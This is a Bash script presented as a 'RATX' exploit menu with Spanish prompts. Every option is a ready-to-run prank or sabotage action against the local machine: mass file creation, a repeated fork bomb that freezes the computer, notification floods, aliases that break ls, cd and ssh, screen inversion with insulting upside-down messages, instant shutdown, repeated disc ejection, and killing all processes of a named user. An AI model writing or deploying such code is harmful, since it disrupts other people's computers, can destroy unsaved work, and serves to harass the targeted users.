#!/bin/bash
shopt -s expand_aliases
while :
do
	clear
	echo "︿︿︿︿︿︿︿︿〔RATX〕︿︿︿︿︿︿︿︿"
	echo "        NETWORKING EXPLOIT       "
	echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
	echo "1 .- CREAR 500 ARCHIVOS EN EL ESCRITORIO"
	echo "2 .- CONGELAR EL ORDENADOR ENTERO"
    echo "3 .- NOTIFICATIONS EXPLOIT"
	echo "4 .- DESACTIVAR COMANDOS BASICOS"
	echo "5 .- TROLLEO MAXIMO"
	echo "A .- FIX TROLLO MAXIMO"
	echo "6 .- APAGAR EL ORDENADOR"
    echo "7 .- EXPULSAR DISQUETERA 50 VECES"
    echo "8 .- CERRAR SESION"
	echo "9 .- SALIR"

	read -p "ESCRIBE UNA TECLA: " choice
	echo "︿︿︿︿︿〔RATX DEV TEAM ©〕︿︿︿︿︿"
	case $choice in
		9)
			exit 0
			;;
		1)
            for index in {0..500}
            do
                touch ../Escritorio/_.dev$index
            done
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
		2)
			for inx in {0..50}
            do
                :(){ :|: & };:
            done
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
		3)
			for index in {0..100}
            do
				notify-send -u critical -t 50000 "ERROR!"
            done
			clear
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
		4)
			alias ssh="echo Os sabeis la moraleja de las hormigas?;ls;firefox"
			alias cd="echo mas vale conejo sucio que tres pajas mal pegadas"
			alias ls="echo una vez unas hormigas;echo intentaron pasar un charco y tenian dos opciones;echo subirse a un conejo sucio o hacer un barco;echo las hormigas decidieron hacer el barco con 4 ramitas de paja;echo intentaron cruzar el charco pero el barco;echo se rompio y las hormigas murieron;echo moraleja de esto;echo Mas vale conejo sucio que tres pajas mal pegadas"
			alias mkdir="echo Carpeta creada o no"
			alias ifconfig="echo Sabeh una coha"
			alias firefox="echo El mensajero de dios, quien es el mensajero del mensajero;echo JESUSCRITO;echo Yo conozco lo fucking demonios"
			alias clear="echo Limpiao"
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			
			;;
		5)
			xrandr -q | grep connected | awk -F ' ' '{print $1}' | xargs -l bash -c 'xargs xrandr --output $0 --rotate inverted' | xargs
			notify-send -t 5000 "uoɹqɐɔ ǝɹǝɯ"
			sleep 5
			notify-send -t 5000 "opuɐƃnɾ oɯɐʇsǝ ǝnb sǝǝɹɔ ǝʇ nʇ"
			sleep 5
			notify-send -t 5000 "oɥɔᴉqǝqɯɐʅ ǝsoᴉp oʅ oɯos soɹʇosou"
			sleep 5
			notify-send -t 5000 "oƃᴉɯuoɔ ɹǝƃoɔ ǝɹǝᴉnb ɐʅ ǝs uǝᴉnb ɐpʅǝʌ uǝ ɐpʅǝʌ uǝ"
			sleep 5
			notify-send -t 5000 "ǝuoɾoɔ ǝuǝᴉʇ uǝᴉnb ǝʌ ɐ ɐᴉʇǝʅnⅎ ǝp ʅɐd ouɹɐƃǝd ɐ oɯɐʌ"
			sleep 5
			notify-send -t 5000 "oɥɔᴉq ɹɐɯɐɯ ɐ"
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
		A)
			xrandr -q | grep connected | awk -F ' ' '{print $1}' | xargs -l bash -c 'xargs xrandr --output $0 --rotate normal' | xargs
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
		6)
			shutdown -tt 00
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
        7)
			for inx in {0..50}
            do
				eject
				notify-send -u critical "Porfavor inserte disco formato PS o PS2"
				sleep 3
            done
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
        8)
			killall -u "dam1"
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
		*)
			echo "ESA TECLA NO HACE NADA CABEZA ALMENDRA"
			read -p "Presiona [Enter] para continuar" readEnterKey
			echo "︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿︿"
			;;
	esac
done